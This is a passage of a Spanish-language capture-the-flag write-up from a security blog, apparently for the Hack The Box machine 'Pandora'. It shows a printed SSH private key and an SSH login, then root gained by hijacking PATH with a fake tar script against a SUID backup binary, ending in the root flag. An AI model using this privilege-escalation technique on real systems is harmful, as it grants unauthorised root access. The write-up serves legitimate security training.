+UCz9KcVQ59NPcSNVAH8eQhcDE2WOs9dL5KrUpZ5qTXyPaNgKTtGzmI9GT3/uG6KTkgIl24
+UEk3phxF5odO6zlPx0ir9o26zVnP+jYNztrdyCFhZdK5kG6EgxJ25bg113MG6a1/y5fAg+
+G48rg+UnT6F9vwQgcDJCuFZXbQWm46LpnOvghe3hSVS6cp9JoAAADBANVgf1cYaLntTxCG
+z+h90vqvZd2VkovX+ALj3Zi1nh2z1Glpwwh6NQ3Rw6yJt/CHBSHFOGa/Ku24oydivmVTRW
+BeucHYMx5WBi1A90viLRAXH5sV+yglg/c1Lo7nRcnScBgatBnX/o9CZKQVyTYPBXnCSBI+
+QBCQ618KwMUgBnZi0b02FsMFueUB54s3OE2LjhjNJKcIlB1ff9z8Gzr/aT1pgA/VOX7FrY
+XV0V2LIobFf2IS/8WBVpiBwplxdNt7BwAAAMEAwRpPlNZJoA+1FBtxlltoggDf+iZHeQLX
+8qsRZ8F8AGXae/GDLxRzUSyZybN4z2I8FFn7rWCd2P/IZ4xSrst9lakDbm8kMUw66n6QEm
+5rDuOqEIde2c3q9P2YPBnvAJBjV4DWl7IV+GE/HGOdOf95LLzhwC6qJiIcaojgZUbURGXE
+2thcx0xqNir5SH+atl7EvYSYlRaafAoBYHvcn2OJpNJR6sI++vwmQFdUhZCnU9OvD0J5e2
+8HBQDVmx0N9RXZAAAADG1hdHRAcGFuZG9yYQECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div></div>
+<ul>
+<li>Y podemos conectarnos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content nano id_rsa
+➜  content chmod 600 id_rsa
+➜  content ssh -i id_rsa matt@10.10.11.136
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 19 Jun 21:08:19 UTC 2024
+
+  System load:           0.0
+  Usage of /:            63.6% of 4.87GB
+  Memory usage:          15%
+  Swap usage:            0%
+  Processes:             242
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.136
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:def7
+
+  =&gt; /boot is using 91.8% of 219MB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+matt@pandora:~$ export TERM=xterm
+</code></pre></div></div>
+<ul>
+<li>Vamos a ejecutar el <code>pandora_backup</code> que vimos anteriormente para ver que pasa.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ pandora_backup
+[--------------------------------------------------------------------------------------]
+Backup successful!
+Terminating program!
+</code></pre></div></div>
+<ul>
+<li>Como vimos el propietario es <code>root</code> y es <code>SUID</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ ls -l /usr/bin/pandora_backup
+-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
+</code></pre></div></div>
+<ul>
+<li>Es un binario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ file /usr/bin/pandora_backup
+/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+<ul>
+<li>Vemos que se esta usando <code>tar</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ ltrace /usr/bin/pandora_backup
+getuid()                                                                                  = 1000
+geteuid()                                                                                 = 1000
+setreuid(1000, 1000)                                                                      = 0
+puts(&quot;PandoraFMS Backup Utility&quot;PandoraFMS Backup Utility
+)                                                         = 26
+puts(&quot;Now attempting to backup Pandora&quot;...Now attempting to backup PandoraFMS client
+)                                               = 43
+system(&quot;tar -cvf /root/.backup/pandora-b&quot;...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+ &lt;no return ...&gt;
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed&gt; )                                                                    = 512
+puts(&quot;Backup failed!\nCheck your permis&quot;...Backup failed!
+Check your permissions!
+)                                              = 39
++++ exited (status 1) +++
+</code></pre></div></div>
+<ul>
+<li><p>Bueno pues como a nivel de sistema se esta ejecutando <code>tar</code> podemos hacer un <code>PATH Hijacking</code> ya que se esta haciendo de forma relativa y debería ser absoluta para evitarlo.</p>
+</li>
+<li><p>Tendría que usarse de esta forma.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ which tar
+/usr/bin/tar
+</code></pre></div></div>
+<ul>
+<li>Este es el PATH.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</code></pre></div></div>
+<ul>
+<li>Lo que vamos a hacer es que nos de una <code>Bash</code> como <code>root</code> ya que <code>root</code> es la persona que esta ejecutando el binario al crearnos un archivo llamado <code>tar</code> le vamos a decir que el <code>PATH</code> comience desde donde nosotros le indiquemos que es en esta ruta para que tome nuestro <code>tar</code> y no el <code>/usr/bin/tar</code> que esa es su ruta absoluta pero aprovechándonos de que en el binario no se esta haciendo de manera correcta la llamada a <code>/usr/bin/tar</code> es por eso que podemos alterar esto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:~$ cd /tmp
+matt@pandora:/tmp$ touch tar
+matt@pandora:/tmp$ chmod +x tar
+matt@pandora:/tmp$ nano tar
+matt@pandora:/tmp$ cat tar
+/usr/bin/sh
+</code></pre></div></div>
+<ul>
+<li>Ahora el <code>PATH</code> comienza en <code>tmp</code> y como va buscar el <code>tar</code> y el <code>tar</code> lo tenemos en <code>tmp</code> pues como allí lo va a encontrar va a ejecutar el de nosotros y no va a llegar ala ruta donde si esta el <code>tar</code> correcto gracias a esto ejecutara la instrucción que indicamos que es darnos una sh.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:/tmp$ export PATH=/tmp:$PATH
+matt@pandora:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<ul>
+<li>Ahora si lo ejecutamos vamos a obtener una <code>shell</code> como el usuario <code>root</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:/tmp$ pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+# whoami
+root
+# bash
+root@pandora:/tmp# cat /root/root.txt
+774d751ca4a7eabaed28a386f20a26c2
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
